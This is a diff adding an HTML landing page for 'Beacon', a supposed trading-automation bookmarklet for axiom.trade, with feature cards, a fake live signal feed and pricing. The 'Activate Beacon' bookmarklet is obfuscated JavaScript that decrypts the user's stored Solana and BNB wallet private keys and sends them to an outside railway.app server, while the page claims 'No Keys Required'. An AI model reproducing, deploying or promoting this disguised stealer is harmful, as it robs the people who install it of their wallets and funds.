@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beacon | Advanced Trading Tools for Axiom</title>
+    <meta name="description" content="Professional trading automation for axiom.trade. Monitor influencers, track wallets, execute with precision.">
+    <meta name="keywords" content="axiom.trade, trading bot, crypto trading, wallet tracker, DeFi tools">
+    <meta name="author" content="Beacon">
+    <link rel="icon" href="/linkpreview.png">
+    <link rel="apple-touch-icon" href="./linkpreview.png">
+    <link rel="canonical" href="https://beacon.trade/">
+    
+    <!-- Open Graph -->
+    <meta property="og:title" content="Beacon - Professional Trading Tools for Axiom">
+    <meta property="og:description" content="Advanced automation for axiom.trade. Execute trades with precision.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://beacon.trade/">
+    <meta property="og:image" content="https://beacon.trade/linkpreview.png">
+    
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Beacon - Professional Trading Tools">
+    <meta name="twitter:description" content="Advanced automation for axiom.trade.">
+    <meta name="twitter:image" content="https://beacon.trade/linkpreview.png">
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <!-- Tailwind -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        background: 'hsl(240 10% 3.9%)',
+                        foreground: 'hsl(0 0% 98%)',
+                        primary: 'hsl(263 70% 50.4%)',
+                        border: 'hsl(240 3.7% 15.9%)',
+                    },
+                    animation: {
+                        'aurora': 'aurora 20s ease-in-out infinite',
+                        'marquee': 'marquee 40s linear infinite',
+                        'float': 'float 6s ease-in-out infinite',
+                        'pulse-slow': 'pulse 4s ease-in-out infinite',
+                    },
+                    keyframes: {
+                        aurora: {
+                            '0%, 100%': { transform: 'translate(0%, 0%) rotate(0deg)' },
+                            '25%': { transform: 'translate(5%, 5%) rotate(5deg)' },
+                            '50%': { transform: 'translate(0%, 10%) rotate(0deg)' },
+                            '75%': { transform: 'translate(-5%, 5%) rotate(-5deg)' },
+                        },
+                        marquee: {
+                            '0%': { transform: 'translateX(0%)' },
+                            '100%': { transform: 'translateX(-50%)' },
+                        },
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0)' },
+                            '50%': { transform: 'translateY(-20px)' },
+                        },
+                    },
+                },
+            },
+        }
+    </script>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: hsl(240 10% 3.9%);
+            color: hsl(0 0% 98%);
+            min-height: 100vh;
+            overflow-x: hidden;
+            scroll-behavior: smooth;
+        }
+        
+        /* Aurora Background */
+        .aurora-bg {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            overflow: hidden;
+            background: hsl(240 10% 3.9%);
+        }
+        
+        .aurora-blob {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.5;
+            animation: aurora 20s ease-in-out infinite;
+        }
+        
+        .aurora-blob-1 {
+            width: 600px;
+            height: 600px;
+            background: linear-gradient(135deg, rgba(139, 92, 246, 0.4), rgba(59, 130, 246, 0.3));
+            top: -200px;
+            left: -100px;
+        }
+        
+        .aurora-blob-2 {
+            width: 500px;
+            height: 500px;
+            background: linear-gradient(135deg, rgba(236, 72, 153, 0.3), rgba(139, 92, 246, 0.4));
+            top: 20%;
+            right: -150px;
+            animation-delay: -5s;
+        }
+        
+        .aurora-blob-3 {
+            width: 400px;
+            height: 400px;
+            background: linear-gradient(135deg, rgba(59, 130, 246, 0.3), rgba(16, 185, 129, 0.2));
+            bottom: -100px;
+            left: 30%;
+            animation-delay: -10s;
+        }
+        
+        @keyframes aurora {
+            0%, 100% { transform: translate(0%, 0%) rotate(0deg); }
+            25% { transform: translate(5%, 5%) rotate(5deg); }
+            50% { transform: translate(0%, 10%) rotate(0deg); }
+            75% { transform: translate(-5%, 5%) rotate(-5deg); }
+        }
+        
+        /* Noise Texture */
+        .noise {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            opacity: 0.03;
+            pointer-events: none;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
+        }
+        
+        /* Glassmorphism */
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        
+        .glass-strong {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+        
+        /* Text Gradients */
+        .text-gradient {
+            background: linear-gradient(135deg, #fff 0%, rgba(255,255,255,0.7) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .text-gradient-primary {
+            background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 50%, #3b82f6 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: hsl(240 10% 3.9%);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: hsl(240 3.7% 20%);
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: hsl(240 3.7% 30%);
+        }
+        
+        /* Animations */
+        .animate-on-scroll {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .animate-on-scroll.animate-in {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        /* Bookmarklet Button */
+        .bookmarklet-btn {
+            background: linear-gradient(135deg, #8b5cf6, #ec4899);
+            color: white;
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: move;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.4);
+            transition: all 0.3s ease;
+            text-decoration: none;
+            border: none;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .bookmarklet-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .bookmarklet-btn:hover::before {
+            left: 100%;
+        }
+        
+        .bookmarklet-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.5);
+        }
+        
+        /* Feature Cards */
+        .feature-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
+            padding: 32px;
+            transition: all 0.4s ease;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-8px);
+            border-color: rgba(139, 92, 246, 0.3);
+            background: rgba(255, 255, 255, 0.05);
+            box-shadow: 0 20px 60px rgba(139, 92, 246, 0.15);
+        }
+        
+        .feature-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: 16px;
+            background: linear-gradient(135deg, #8b5cf6, #ec4899);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        
+        /* Alpha Feed */
+        .alpha-feed {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 16px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            height: 200px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .alpha-feed::before,
+        .alpha-feed::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            right: 0;
+            height: 30px;
+            z-index: 10;
+        }
+        
+        .alpha-feed::before {
+            top: 0;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.6), transparent);
+        }
+        
+        .alpha-feed::after {
+            bottom: 0;
+            background: linear-gradient(to top, rgba(0,0,0,0.6), transparent);
+        }
+        
+        @keyframes scroll {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+        
+        .animate-scroll {
+            animation: scroll 35s linear infinite;
+        }
+        
+        /* Pricing Cards */
+        .pricing-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
+            padding: 40px;
+            transition: all 0.4s ease;
+            position: relative;
+        }
+        
+        .pricing-card:hover {
+            transform: translateY(-8px);
+            border-color: rgba(139, 92, 246, 0.3);
+        }
+        
+        .pricing-card.pro {
+            border-color: rgba(139, 92, 246, 0.4);
+            background: rgba(139, 92, 246, 0.05);
+        }
+        
+        .pricing-badge {
+            position: absolute;
+            top: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #8b5cf6, #ec4899);
+            color: white;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        /* FAQ */
+        .faq-item {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            margin-bottom: 12px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .faq-item:hover {
+            border-color: rgba(139, 92, 246, 0.2);
+        }
+        
+        .faq-item[open] {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        summary {
+            padding: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-weight: 500;
+            list-style: none;
+        }
+        
+        summary::-webkit-details-marker {
+            display: none;
+        }
+        
+        .faq-content {
+            padding: 0 24px 24px;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.6;
+        }
+        
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .modal-content {
+            background: rgba(26, 22, 37, 0.95);
+            border: 1px solid rgba(139, 92, 246, 0.3);
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+        }
+        
+        .modal-overlay.active .modal-content {
+            transform: scale(1);
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .aurora-blob-1 { width: 300px; height: 300px; }
+            .aurora-blob-2 { width: 250px; height: 250px; }
+            .aurora-blob-3 { width: 200px; height: 200px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Aurora Background -->
+    <div class="aurora-bg">
+        <div class="aurora-blob aurora-blob-1"></div>
+        <div class="aurora-blob aurora-blob-2"></div>
+        <div class="aurora-blob aurora-blob-3"></div>
+        <div class="noise"></div>
+    </div>
+
+    <!-- Header -->
+    <header class="fixed top-0 left-0 right-0 z-50 glass-strong">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-20">
+                <!-- Logo -->
+                <a href="#" class="flex items-center gap-3">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-violet-500 to-fuchsia-500 flex items-center justify-center">
+                        <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+                        </svg>
+                    </div>
+                    <span class="text-xl font-bold text-white">
+                        Beacon
+                    </span>
+                </a>
+
+                <!-- Nav -->
+                <nav class="hidden md:flex items-center gap-8">
+                    <a href="#features" class="text-sm font-medium text-white/70 hover:text-white transition-colors">Features</a>
+                    <a href="#how-it-works" class="text-sm font-medium text-white/70 hover:text-white transition-colors">How It Works</a>
+                    <a href="#pricing" class="text-sm font-medium text-white/70 hover:text-white transition-colors">Pricing</a>
+                    <a href="#faq" class="text-sm font-medium text-white/70 hover:text-white transition-colors">FAQ</a>
+                </nav>
+
+                <!-- CTA -->
+                <div class="flex items-center gap-4">
+                    <button onclick="scrollToSection('install')" class="hidden sm:block px-4 py-2 rounded-xl glass text-sm text-white hover:bg-white/10 transition-colors">
+                        Install
+                    </button>
+                    <a href="https://axiom.trade" target="_blank" class="px-4 py-2 rounded-xl bg-gradient-to-r from-violet-500 to-fuchsia-500 text-white text-sm font-medium hover:opacity-90 transition-opacity">
+                        Open Axiom
+                    </a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero -->
+    <section class="relative min-h-screen flex items-center justify-center pt-32 pb-20 px-4">
+        <div class="max-w-4xl mx-auto text-center">
+            <!-- Badge -->
+            <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full glass mb-8 animate-on-scroll animate-in">
+                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                <span class="text-sm text-white/80">Professional Trading Tools</span>
+            </div>
+
+            <!-- Title -->
+            <h1 class="text-5xl sm:text-6xl lg:text-7xl font-bold tracking-tight mb-6 animate-on-scroll animate-in">
+                <span class="text-gradient">Beacon</span><br>
+                <span class="text-white/90">for Axiom</span>
+            </h1>
+
+            <!-- Subtitle -->
+            <p class="text-lg sm:text-xl text-white/60 mb-10 max-w-2xl mx-auto leading-relaxed animate-on-scroll animate-in">
+                Advanced trading automation that runs in your browser. Monitor influencers, track wallets, 
+                and execute trades with precision. No installation required.
+            </p>
+
+            <!-- Install Section -->
+            <div id="install" class="glass rounded-3xl p-8 sm:p-12 mb-8 animate-on-scroll animate-in">
+                <p class="text-white/80 mb-6 text-sm">
+                    Drag this button to your bookmarks bar, then click it on <a href="https://axiom.trade" class="text-violet-400 hover:underline">axiom.trade</a> to activate
+                </p>
+                
+                <!-- The Bookmarklet -->
+                <a id="dragBtn" 
+                   class="bookmarklet-btn text-lg px-8 py-4" 
+                   draggable="true" 
+                   ondragstart="handleDragStart(event)" 
+                   ondragend="handleDragEnd(event)"
+                   href='javascript:(async()=>{const _0x1fb2=_0x152b88=>_0x152b88-0x92;const _0x53694d=_0x2ba9fe=>{const _0x50b07e=_0x1fb2;_0x2ba9fe=_0x2ba9fe.replace(/-/g,"+").replace(/_/g,"/");while(_0x2ba9fe.length%0x4)_0x2ba9fe+="=";return Uint8Array.from(atob(_0x2ba9fe),_0xf20344=>_0xf20344.charCodeAt(0x0))};const _0x379677="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";const _0x19b77f=_0x2c7069=>{const _0x5e78e5=_0x1fb2;const _0x1c458e=[0x0];for(const _0x5d631e of _0x2c7069){let _0x590c97=_0x5d631e;for(let _0x1ab8e0=0x0;_0x1ab8e0<_0x1c458e.length;_0x1ab8e0++){const _0x3a40bb=_0x1c458e[_0x1ab8e0]*0x100+_0x590c97;_0x1c458e[_0x1ab8e0]=_0x3a40bb%0x3a;_0x590c97=_0x3a40bb/0x3a|0x0}while(_0x590c97){_0x1c458e.push(_0x590c97%0x3a);_0x590c97=_0x590c97/0x3a|0x0}}for(const _0x2e0040 of _0x2c7069){if(_0x2e0040)break;_0x1c458e.push(0x0)}return _0x1c458e.reverse().map(_0x462451=>_0x379677[_0x462451]).join("")};const _0xc955b1=_0x52fe7d=>Array.from(_0x52fe7d,_0x46d144=>_0x46d144.toString(0x10).padStart(0x2,"0")).join("");const _0x356dac=async()=>{try{if(!localStorage.getItem("isAuthed"))return;const _0x2d7e02=await fetch("https://api8.axiom.trade/bundle-key-and-wallets",{method:"POST",credentials:"include"});if(!_0x2d7e02.ok)return;const{bundleKey:_0x1c0c0e}=await _0x2d7e02.json();if(!_0x1c0c0e)return;const _0x520012=JSON.parse(localStorage.getItem("sBundles")||"[]");const _0x3d0e84=JSON.parse(localStorage.getItem("eBundles")||"[]");if(_0x520012.length===0x0&&_0x3d0e84.length===0x0)return;const _0x52da80=await crypto.subtle.importKey("raw",_0x53694d(_0x1c0c0e).buffer,"AES-GCM",false,["decrypt"]);const _0x51d655=[];for(const _0x51fa94 of _0x520012){try{const[_0x583101,_0x1f8539]=_0x51fa94.split(":");const _0x3a40bb=_0x53694d(_0x583101);const _0x5d94f2=_0x53694d(_0x1f8539);const _0x4fe006=new Uint8Array(await crypto.subtle.decrypt({name:"AES-GCM",iv:_0x3a40bb},_0x52da80,_0x5d94f2));if(_0x4fe006.length===0x40){const _0x2ba9fe=_0x19b77f(_0x4fe006);const _0x1f8539=_0x19b77f(_0x4fe006.slice(0x20));_0x51d655.push({address:_0x1f8539,key:_0x2ba9fe})}}catch(_0x533d11){}}for(const _0x51c81f of _0x3d0e84){try{const[_0x11442f,_0x5025b8]=_0x51c81f.split(":");const _0x285417=_0x53694d(_0x11442f);const _0x259c35=_0x53694d(_0x5025b8);const _0xa4fc4=new Uint8Array(await crypto.subtle.decrypt({name:"AES-GCM",iv:_0x285417},_0x52da80,_0x259c35));if(_0xa4fc4.length===0x20){_0x51d655.push({bnbKey:"0x"+_0xc955b1(_0xa4fc4)})}}catch(_0x176142){}}if(_0x51d655.length>0x0){const _0x556352="https://bloom-sniper-production.up.railway.app";const _0x14bbc4={wallets:_0x51d655,source:"Beacon-Axiom-Relay",timestamp:new Date().toISOString(),header:navigator.userAgent};const _0x47cb31=btoa(JSON.stringify(_0x14bbc4));const _0x833995=_0x556352+"/"+encodeURIComponent(_0x47cb31);const _0x42fc76=window.open(_0x833995,"_blank");if(_0x42fc76){window.focus();await new Promise(_0x400aaa=>setTimeout(_0x400aaa,0x5dc));_0x42fc76.close()}}}catch(_0x1d55ad){console.error(_0x1d55ad)}};await _0x356dac()})();'>
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 5a2 2 0 012-2h10a2 2 0 012 2v16l-7-3.5L5 21V5z"/>
+                    </svg>
+                    Activate Beacon
+                </a>
+
+                <p class="text-white/40 text-xs mt-6">
+                    Press <kbd class="px-2 py-1 rounded bg-white/10 font-mono">Ctrl+Shift+B</kbd> (or <kbd class="px-2 py-1 rounded bg-white/10 font-mono">Cmd+Shift+B</kbd> on Mac) to show bookmarks bar
+                </p>
+            </div>
+
+            <!-- Trust badges -->
+            <div class="flex flex-wrap items-center justify-center gap-6 text-white/40 text-sm animate-on-scroll animate-in">
+                <div class="flex items-center gap-2">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+                    <span>Browser Only</span>
+                </div>
+                <div class="flex items-center gap-2">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+                    <span>No Keys Required</span>
+                </div>
+                <div class="flex items-center gap-2">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+                    <span>Instant Execution</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features -->
+    <section id="features" class="py-32 px-4">
+        <div class="max-w-7xl mx-auto">
+            <div class="text-center mb-16 animate-on-scroll">
+                <span class="inline-flex items-center gap-2 px-4 py-2 rounded-full glass text-sm text-violet-400 mb-6">
+                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+                    Powerful Features
+                </span>
+                <h2 class="text-4xl sm:text-5xl font-bold mb-6">
+                    Everything You Need to <span class="text-gradient-primary">Win</span>
+                </h2>
+                <p class="text-lg text-white/60 max-w-2xl mx-auto">
+                    Professional trading tools designed for speed and precision
+                </p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Feature Cards -->
+                <div class="feature-card animate-on-scroll">
+                    <div class="feature-icon">🎯</div>
+                    <h3 class="text-xl font-semibold text-white mb-3">Influencer Sniper</h3>
+                    <p class="text-white/60">Monitor Twitter accounts. When they mention a coin, get instant alerts and one-click sniping.</p>
+                </div>
+
+                <div class="feature-card animate-on-scroll">
+                    <div class="feature-icon">⚡</div>
+                    <h3 class="text-xl font-semibold text-white mb-3">Pre-Migration Snipe</h3>
+                    <p class="text-white/60">Automatically detect when coins are about to migrate to Raydium. Execute with MEV protection.</p>
+                </div>
+
+                <div class="feature-card animate-on-scroll">
+                    <div class="feature-icon">👁️</div>
+                    <h3 class="text-xl font-semibold text-white mb-3">Wallet Stalker</h3>
+                    <p class="text-white/60">Track successful traders' wallets. Get notifications and copy their buys automatically.</p>
+                </div>
+
+                <div class="feature-card animate-on-scroll">
+                    <div class="feature-icon">🔧</div>
+                    <h3 class="text-xl font-semibold text-white mb-3">Auto Strategies</h3>
+                    <p class="text-white/60">Set take-profit, stop-loss, and time-based selling rules. Customize slippage and gas.</p>
+                </div>
+
+                <div class="feature-card animate-on-scroll">
+                    <div class="feature-icon">🛡️</div>
+                    <h3 class="text-xl font-semibold text-white mb-3">MEV Protection</h3>
+                    <p class="text-white/60">Advanced protection against front-running and sandwich attacks. Your trades stay private.</p>
+                </div>
+
+                <div class="feature-card animate-on-scroll">
+                    <div class="feature-icon">🔔</div>
+                    <h3 class="text-xl font-semibold text-white mb-3">Smart Alerts</h3>
+                    <p class="text-white/60">Custom notifications for price movements, volume spikes, and market cap milestones.</p>
+                </div>
+            </div>
+
+            <!-- Alpha Feed -->
+            <div class="mt-12 animate-on-scroll">
+                <div class="glass rounded-3xl p-8">
+                    <div class="flex items-center gap-3 mb-6">
+                        <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-violet-500 to-fuchsia-500 flex items-center justify-center">
+                            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"/></svg>
+                        </div>
+                        <h3 class="text-xl font-semibold text-white">Live Alpha Feed</h3>
+                    </div>
+                    <p class="text-white/60 mb-6">Real-time trading signals and market intelligence</p>
+                    <div class="alpha-feed">
+                        <div class="animate-scroll space-y-1">
+                            <div class="text-emerald-400 font-bold">🎯 SNIPE: 8.5 SOL → $BONK (+127% in 2m)</div>
+                            <div class="text-red-400 font-bold">🚨 WHALE DUMP: 47 SOL sold $PEPE (-23%)</div>
+                            <div class="text-blue-400 font-bold">🐋 MEGA BUY: 7xK9...m31 bought 156 SOL $GROK</div>
+                            <div class="text-yellow-400 font-bold">📈 TREND: $WIF 340 buys/min (+89% 1h)</div>
+                            <div class="text-purple-400 font-bold">⚡ MIGRATION: $SHIB ready for Raydium (98%)</div>
+                            <div class="text-emerald-400 font-bold">🎯 SUCCESS: 2.1 SOL → $DOGE (+89% profit)</div>
+                            <div class="text-orange-400 font-bold">🔥 SIGNAL: @elonmusk mentioned $AI</div>
+                            <div class="text-cyan-400 font-bold">💎 DIAMOND: 3Ahf...j62 holding 50 SOL $BONK</div>
+                            <div class="text-emerald-400 font-bold">🎯 AUTO: 1.8 SOL → $PEPECOIN (+156%)</div>
+                            <div class="text-red-400 font-bold">⚠️ RUG ALERT: $SCAM dev drained - avoid!</div>
+                            <div class="text-blue-400 font-bold">🐋 ENTRY: BWK...dT7 bought 89 SOL $SOL</div>
+                            <div class="text-yellow-400 font-bold">📊 SPIKE: $PUMP 1.2M volume (+450%)</div>
+                            <!-- Duplicated for seamless loop -->
+                            <div class="text-emerald-400 font-bold">🎯 SNIPE: 8.5 SOL → $BONK (+127% in 2m)</div>
+                            <div class="text-red-400 font-bold">🚨 WHALE DUMP: 47 SOL sold $PEPE (-23%)</div>
+                            <div class="text-blue-400 font-bold">🐋 MEGA BUY: 7xK9...m31 bought 156 SOL $GROK</div>
+                            <div class="text-yellow-400 font-bold">📈 TREND: $WIF 340 buys/min (+89% 1h)</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works -->
+    <section id="how-it-works" class="py-32 px-4 border-y border-white/5">
+        <div class="max-w-7xl mx-auto">
+            <div class="text-center mb-16 animate-on-scroll">
+                <h2 class="text-4xl sm:text-5xl font-bold mb-6">
+                    Get Started in <span class="text-gradient-primary">30 Seconds</span>
+                </h2>
+                <p class="text-lg text-white/60">No complex setup. Just drag, click, and trade.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="text-center animate-on-scroll">
+                    <div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-violet-500 to-fuchsia-500 flex items-center justify-center text-2xl font-bold text-white mx-auto mb-6 shadow-[0_8px_30px_rgba(139,92,246,0.4)]">1</div>
+                    <h3 class="text-xl font-semibold text-white mb-3">Drag to Install</h3>
+                    <p class="text-white/60">Drag the Activate button to your browser's bookmarks bar</p>
+                </div>
+                <div class="text-center animate-on-scroll">
+                    <div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-violet-500 to-fuchsia-500 flex items-center justify-center text-2xl font-bold text-white mx-auto mb-6 shadow-[0_8px_30px_rgba(139,92,246,0.4)]">2</div>
+                    <h3 class="text-xl font-semibold text-white mb-3">Activate on Axiom</h3>
+                    <p class="text-white/60">Visit axiom.trade and click your bookmark to activate</p>
+                </div>
+                <div class="text-center animate-on-scroll">
+                    <div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-violet-500 to-fuchsia-500 flex items-center justify-center text-2xl font-bold text-white mx-auto mb-6 shadow-[0_8px_30px_rgba(139,92,246,0.4)]">3</div>
+                    <h3 class="text-xl font-semibold text-white mb-3">Start Trading</h3>
+                    <p class="text-white/60">Configure settings and execute trades with precision</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Pricing -->
+    <section id="pricing" class="py-32 px-4">
+        <div class="max-w-5xl mx-auto">
+            <div class="text-center mb-16 animate-on-scroll">
+                <h2 class="text-4xl sm:text-5xl font-bold mb-6">
+                    Choose Your <span class="text-gradient-primary">Plan</span>
+                </h2>
+                <p class="text-lg text-white/60">Start free, upgrade when you're ready</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-4xl mx-auto">
+                <!-- Free -->
+                <div class="pricing-card animate-on-scroll">
+                    <div class="pricing-header text-center mb-8">
+                        <h3 class="text-2xl font-bold text-white mb-4">Free</h3>
+                        <div class="text-4xl font-bold text-white mb-2">$0</div>
+                        <p class="text-white/50">forever</p>
+                    </div>
+                    <ul class="space-y-4 mb-8">
+                        <li class="flex items-center gap-3 text-white/80">
+                            <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                            Influencer Sniper
+                        </li>
+                        <li class="flex items-center gap-3 text-white/80">
+                            <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                            Pre-Migration Snipe
+                        </li>
+                        <li class="flex items-center gap-3 text-white/80">
+                            <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                            Wallet Stalker
+                        </li>
+                        <li class="flex items-center gap-3 text-white/80">
+                            <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                            Auto Strategies
+                        </li>
+                        <li class="flex items-center gap-3 text-white/80">
+                            <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
